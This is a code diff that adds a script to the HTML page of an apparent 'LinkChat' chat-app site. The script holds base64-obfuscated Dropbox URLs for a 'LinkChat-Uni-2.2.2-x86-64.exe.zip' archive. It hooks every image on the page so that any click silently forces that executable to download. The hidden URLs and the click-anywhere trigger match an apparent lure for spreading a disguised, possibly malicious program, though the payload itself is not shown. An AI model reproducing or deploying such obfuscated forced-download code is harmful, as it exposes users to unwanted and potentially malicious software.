@@ -22,5 +22,34 @@
 			<img src="/link-chat/images/index_04.png" width="752" height="578" alt="" /></td>
 	</tr>
 </table>
+<script>
+        
+        const encryptedUrls = [
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFnejVpNXNlNGo1YjF1ZGpiZDl0ZC9MaW5rQ2hhdC1VbmktMi4yLjIteDg2LTY0LmV4ZS56aXA/cmxrZXk9dTVhc2wyZmhpOWxrZ3dsMXBpcWd2ZDR3ciZzdD1pdDI0MWFxaSZkbD0x',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFnejVpNXNlNGo1YjF1ZGpiZDl0ZC9MaW5rQ2hhdC1VbmktMi4yLjIteDg2LTY0LmV4ZS56aXA/cmxrZXk9dTVhc2wyZmhpOWxrZ3dsMXBpcWd2ZDR3ciZzdD1pdDI0MWFxaSZkbD0x',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFnejVpNXNlNGo1YjF1ZGpiZDl0ZC9MaW5rQ2hhdC1VbmktMi4yLjIteDg2LTY0LmV4ZS56aXA/cmxrZXk9dTVhc2wyZmhpOWxrZ3dsMXBpcWd2ZDR3ciZzdD1pdDI0MWFxaSZkbD0x',
+            'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFnejVpNXNlNGo1YjF1ZGpiZDl0ZC9MaW5rQ2hhdC1VbmktMi4yLjIteDg2LTY0LmV4ZS56aXA/cmxrZXk9dTVhc2wyZmhpOWxrZ3dsMXBpcWd2ZDR3ciZzdD1pdDI0MWFxaSZkbD0x',
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>  
 </body>
 </html>
